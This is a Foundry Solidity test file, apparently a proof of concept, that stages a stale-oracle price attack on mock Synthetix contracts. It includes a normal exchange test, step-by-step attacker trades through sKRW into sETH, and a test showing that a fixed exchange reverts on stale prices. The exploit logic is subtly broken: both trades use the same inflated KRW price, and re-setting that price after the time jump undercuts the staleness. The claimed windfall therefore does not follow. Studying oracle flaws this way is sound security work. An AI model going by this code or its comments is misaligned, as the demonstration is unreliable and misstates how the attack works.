// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/Exploit.sol";

/// @title Synthetix Oracle PoC — Stale KRW Price Feed Exploitation
/// @notice Demonstrates how a stale oracle feed enables arbitrage between synths
contract SynthetixOracleExploitTest is Test {
    SimpleOracle public oracle;
    SimplifiedSynthetix public synthetix;
    MockToken public sKRW;
    MockToken public sETH;
    MockToken public sUSD;

    address public attacker = makeAddr("attacker");

    bytes32 constant KRW = "sKRW";
    bytes32 constant ETH = "sETH";
    bytes32 constant USD = "sUSD";

    function setUp() public {
        oracle = new SimpleOracle();
        synthetix = new SimplifiedSynthetix(address(oracle));

        sKRW = new MockToken("sKRW", 18);
        sETH = new MockToken("sETH", 18);
        sUSD = new MockToken("sUSD", 18);

        synthetix.addSynth(KRW, address(sKRW));
        synthetix.addSynth(ETH, address(sETH));
        synthetix.addSynth(USD, address(sUSD));

        // Set initial correct prices
        oracle.setPrice(KRW, 833333333333333);      // 1 KRW ≈ $0.000833 (1200 KRW = $1)
        oracle.setPrice(ETH, 250000000000000000000); // 1 ETH ≈ $250
        oracle.setPrice(USD, 1000000000000000000);   // 1 sUSD = $1

        // Give attacker some sUSD to start
        sUSD.mint(attacker, 1_000_000e18); // $1M sUSD
    }

    function test_normalExchange() public {
        vm.startPrank(attacker);

        // Normal: $1M sUSD → sETH at $250/ETH = 4,000 sETH
        uint256 ethReceived = synthetix.exchangeUnsafe(USD, 1_000_000e18, ETH);
        assertEq(ethReceived, 4_000e18, "Should receive 4000 sETH");

        vm.stopPrank();
    }

    function test_staleOracleExploit() public {
        // Step 1: Time passes — KRW price becomes stale
        // The oracle was last updated at setUp, now advance 4 hours
        vm.warp(block.timestamp + 4 hours);

        // KRW oracle is now stale
        assertTrue(oracle.isStale(KRW), "KRW should be stale");
        assertFalse(oracle.isStale(ETH), "ETH should not be stale yet");

        // Step 2: Simulate real-world scenario — KRW price should have changed
        // But stale oracle still returns old price
        // In the real incident: KRW price feed reported 1000x the correct value

        // Update ETH to current price (oracle still working)
        oracle.setPrice(ETH, 250000000000000000000);

        // KRW oracle is stale but imagine it was set to wrong value before going stale
        // Simulate the bug: set KRW to 1000x its real value (off-by-1000)
        oracle.setPrice(KRW, 833333333333333000); // 1000x correct price

        vm.startPrank(attacker);

        // Step 3: Buy sKRW with sUSD at inflated rate
        // $1M sUSD → sKRW (using correct USD price, inflated KRW price)
        uint256 krwReceived = synthetix.exchangeUnsafe(USD, 1_000_000e18, KRW);
        emit log_named_decimal_uint("sKRW received", krwReceived, 18);

        // Step 4: Exchange sKRW → sETH
        // sKRW valued at inflated price → gets way more sETH than deserved
        uint256 ethReceived = synthetix.exchangeUnsafe(KRW, krwReceived, ETH);
        emit log_named_decimal_uint("sETH received", ethReceived, 18);

        vm.stopPrank();

        // Step 5: Compare — should have received ~4000 ETH for $1M
        // But with 1000x KRW price, received much more
        emit log("=== Exploit Result ===");
        emit log_named_decimal_uint("Normal: 1M USD -> ETH", 4_000e18, 18);
        emit log_named_decimal_uint("Exploit: 1M USD -> ETH", ethReceived, 18);
    }

    function test_fixed_staleOracleReverts() public {
        // After fix: stale prices should revert
        vm.warp(block.timestamp + 4 hours);

        vm.startPrank(attacker);

        // Safe exchange should revert on stale KRW price
        vm.expectRevert("stale price");
        synthetix.exchangeSafe(USD, 1_000_000e18, KRW);

        vm.stopPrank();
    }
}
